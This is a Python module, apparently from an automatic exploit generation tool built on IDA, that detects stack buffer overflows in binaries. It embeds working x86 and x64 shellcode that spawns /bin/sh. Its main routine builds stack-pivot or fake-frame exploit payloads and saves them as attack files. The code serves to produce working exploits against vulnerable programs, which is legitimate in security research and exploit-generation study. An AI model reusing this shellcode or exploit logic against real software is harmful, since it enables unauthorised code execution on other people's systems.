#-*- coding:utf-8 -*-
'''
跟缓冲区相关的函数、功能、检测
'''


from AEGconfig import *
from idc import *
from AEGcommon import *
import struct
import AEGfunction
import AEGInstruction
from AEGexceptions import *
from AEGinfo import *
from AEGagent import *
from AEGframe import Getoffset_SP2BP

shellcode_x86 = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"
shellcode_x64 = "H1\xc9H\xf7\xe1QH\xbb/bin//shSH\x89\xe3\xb0\x0b\xcd\x80"





def BufferOverflowDetector():
	if INFO_SEC_CANARY :
		### 可以考虑stack smash。但是一般情况下stack smash的目标不确定，可能需要人为指定才行。
		### ### TODO: Partitial Overwrite 
		raise NotImplementedException("Stack smash(TODO)")
	_tmp = _DetectDangerFuncs()
	if _tmp is not None:
		xref_addr , input_size , offset_BP = _tmp
		printf("input_size = %d, ofsset_bp = %d" % (input_size , offset_BP) , verbose=LOG_LEVEL_DEBUG)
		shellcode = StackPivot(offset_BP)
		if not shellcode:
			### Fake Frame
			if FrameFaking(input_size , offset_BP,xref_addr):
				printf("Frame Faking success! See *.atk.py")
		else:
			## 保存shellcode
			AEG_save_file(INFO_INPUT_FILENAME + ".stackpivot",shellcode,"wb")
	else :
		raise NotImplementedException()